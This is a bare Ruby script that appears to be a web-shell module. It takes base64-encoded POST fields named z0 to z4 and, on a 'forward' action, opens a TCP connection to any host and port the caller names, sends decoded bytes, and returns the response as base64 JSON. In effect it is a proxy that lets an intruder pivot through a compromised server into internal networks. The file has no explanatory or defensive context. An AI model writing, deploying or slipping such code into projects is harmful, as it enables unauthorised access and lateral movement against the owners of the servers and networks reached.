require 'socket'
require 'base64'
require 'json'

def main
  return if $_POST['z0'].nil?

  action = Base64.decode64($_POST['z0'].to_s)

  if action == "forward"
    if $_POST['z2'].nil? || $_POST['z3'].nil? || $_POST['z4'].nil?
      return
    end

    target_ip = Base64.decode64($_POST['z2'].to_s)
    target_port = Base64.decode64($_POST['z3'].to_s).to_i
    
    data_bytes = Base64.decode64(Base64.decode64($_POST['z4'].to_s))

    begin
      sock = Socket.tcp(target_ip, target_port, connect_timeout: 3)
      
      if data_bytes && !data_bytes.empty?
        sock.syswrite(data_bytes)
      end

      response = ""
      retry_count = 0

      while retry_count < 3
        sleep(0.05)

        has_data = false
        begin
          while (chunk = sock.read_nonblock(8192))
            response << chunk
            has_data = true
          end
        rescue IO::WaitReadable
        rescue EOFError
          break
        end

        if has_data && !response.empty?
          break
        end
        retry_count += 1
      end

      sock.close unless sock.closed?

      encoded_res = Base64.strict_encode64(response)
      print JSON.generate({ "status" => "success", "data" => encoded_res })

    rescue => e
      print JSON.generate({ "status" => "error", "msg" => e.message })
    ensure
      sock.close if sock && !sock.closed?
    end
    return
  end
end

main